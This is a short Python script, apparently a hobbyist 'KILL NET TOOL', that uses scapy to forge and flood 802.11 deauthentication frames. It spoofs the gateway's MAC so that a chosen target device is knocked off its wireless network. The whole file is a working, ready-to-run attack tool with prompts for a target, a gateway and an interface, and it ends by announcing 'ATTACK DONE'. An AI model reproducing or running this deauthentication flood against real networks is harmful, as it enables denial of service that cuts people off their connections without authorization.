#! /usr/bin/env python

# Developer: Victor Pegoraro

import scapy.all as scapy
import colorama

# init the colorama module
colorama.init()
GREEN = colorama.Fore.GREEN
RESET = colorama.Fore.RESET
CYAN = colorama.Fore.CYAN
RED = colorama.Fore.RED
YELLOW = colorama.Fore.YELLOW

#Start print
start = """
        ############################
        ##                        ##
        ##     KILL NET TOOL      ##
        ##  Dev: Victor Pegoraro  ##
        ##                        ##
        ## V 1.0                  ##
        ############################
        """


#Start program
print(f"{RED}" + start)

#Show intructions
print(f"{YELLOW}\n[!] Before run this program set your wireless card to monitor mode \n")

#Get informations from router
target_mac  = input(f"{CYAN}Target MAC [EX: 68-7D-6B-OE-b-41]={RESET} ")
gateway_mac = input(f"{CYAN}Gateway MAC [EX: a4-33-d7-3a-d0-37]={RESET} ")
interface   = input(f"{CYAN}interface [EX: wlan0man]={RESET} ")
packets     = int(input(f"{CYAN}Number os packets={RESET} "))

#Create packet
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = scapy.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = scapy.RadioTap()/dot11/scapy.Dot11Deauth(reason=7)

# send the packets
p = 0
while p <= packets:
    scapy.sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
    print(f"{YELLOW}[!] Packets send " + str(p))#show number of send packets
    p += 1

print(f"{GREEN}\n[+] ATTACK DONE !!!{RESET}")